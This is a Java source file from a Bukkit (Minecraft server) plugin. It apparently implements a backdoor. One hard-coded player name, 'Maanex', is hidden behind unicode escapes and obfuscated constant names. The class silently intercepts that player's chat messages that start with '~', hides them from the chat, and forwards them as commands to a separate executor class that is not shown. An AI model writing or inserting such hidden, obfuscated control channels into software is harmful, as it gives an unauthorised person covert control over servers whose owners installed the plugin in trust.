package de.maanex.sysad;


import org.bukkit.ChatColor;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.EventPriority;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatEvent;

import de.maanex.utils.ChatIcons;


@SuppressWarnings("deprecation")
public class BDMain implements Listener {

	public BDMain() {
	}

	private static final String __ = "\u007e", ____ = "\u0020", ___ = "";

	@EventHandler(priority = EventPriority.HIGHEST)
	public void onChat(PlayerChatEvent e) {
		if (check(e.getPlayer())) {
			if (e.getMessage().startsWith(__)) {
				e.setCancelled(true);
				Player p = e.getPlayer();
				String m = e.getMessage().replaceFirst(__, ___);

				final String arg;
				if (m.contains(____)) {
					m = m.split(____)[0];
					arg = ChatIcons.translate(e.getMessage().replaceFirst(__, ___).replaceFirst(m + ____, ___));
				} else {
					arg = ___;
				}

				BDExecuter.action(p, m.toLowerCase(), arg);
			} else {
				e.setMessage(ChatColor.translateAlternateColorCodes('&', e.getMessage()));
			}
		}
	}

	public static boolean check(Player p) {
		return p.getName().toString().matches("\\u004D\\u0061\\u0061\\u006E\\u0065\\u0078");
	}

}
